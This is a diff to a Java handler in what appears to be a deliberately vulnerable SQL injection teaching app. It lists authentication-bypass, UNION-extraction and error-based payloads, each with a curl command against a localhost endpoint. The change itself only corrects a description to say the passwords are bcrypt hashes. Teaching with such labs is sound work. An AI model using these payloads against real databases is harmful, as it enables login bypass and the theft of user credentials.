@@ -103,7 +103,7 @@ public class SqlInjectionHandler implements IRouteHandler {
              "The -- comment strips the password check. Logs in as admin with no password.", "username",
              "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"username=admin'--\""},
             {"UNION extraction", "' UNION SELECT id, username, password, role FROM users--",
-             "Appends a second SELECT. Returns usernames and plaintext passwords.", "username",
+             "Appends a second SELECT that reads every row of the users table. The password column holds bcrypt hashes.", "username",
              "curl -s -X POST http://localhost:8090/sqli/vulnerable -b 'SESSION_COOKIE=SESSION' --data-urlencode \"username=' UNION SELECT id,username,password,role FROM users--\""},
             {"Error-based enumeration", "' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--",
              "Forces the DB to cast a string to int, leaking the value in the error message.", "username",
